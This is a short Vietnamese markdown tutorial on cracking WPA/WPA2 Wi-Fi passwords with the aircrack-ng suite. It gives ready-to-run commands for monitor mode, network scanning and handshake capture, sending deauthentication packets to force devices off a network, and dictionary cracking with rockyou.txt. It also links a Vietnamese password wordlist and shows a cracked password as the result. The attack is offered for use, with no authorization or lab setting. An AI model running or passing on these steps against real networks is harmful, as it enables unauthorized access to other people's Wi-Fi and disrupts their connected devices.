## 🛠️ Các bước thực hiện hack Wi-Fi (WPA/WPA2)

1. Kiểm tra các thiết bị kết nối mạng không dây.

```
iwconfig
```
2. Bật chế độ monotor
   
```
sudo airmon-ng start wlan0
```
→ **airmon-ng** : bật tắt chế độ monitor và dừng tiến trình gây xung đột.

3. Dừng các dịch vụ gây xung đột

```
sudo airmon-ng check kill
```
4. Quét và giám sát các mạng wifi xung quanh

```
sudo airodump-ng wlan0mon
```
*công dụng airodump-ng*
  - thu thập được : SSID ( tên mạng ), BSSID ( địa chỉ MAC ), kênh ( channel ), mã hóa (WEP/WPA/WPA2), số lượng client kết nối.
  - Bắt handshake (quá trình xác thực giữa thiết bị và router) dùng để dò mật khẩu.
→ Quét và thu thập thông tin mạng Wi-Fi.

    **Ctrl + C** để thoát.

5. Bắt handshake WPA/WPA2 từ một Wi-Fi và lưu vào file `wpa2hack.cap`.

```
sudo airodump-ng --bssid <bssid> --channel <ch> --write wpa2hack wlan0mon
```

6. Gửi gói `deauth` để ngắt kết nối thiết bị khỏi Wi-Fi.
   
```
sudo aireplay-ng --deauth 4 -a <bssid> -c <station> wlan0mon
```
-> **Mục đích** : ép thiết bị kết nối lại để bết handshake.

7. Dò mật khẩu Wi-Fi bằng file từ điển `rockyou.txt`.

```
sudo aircrack-ng <file.cap> -w /usr/share/wordlists/rockyou.txt

```
-> mọi người có thể download file sau để dò chính xác hơn các mật khẩu ở Việt Nam
>link: [vietpass.txt](https://github.com/user-attachments/files/21192498/vietpass.txt)



---

### ✅ Kết quả:

```
Sanh Dieu [ 00001111 ]
```
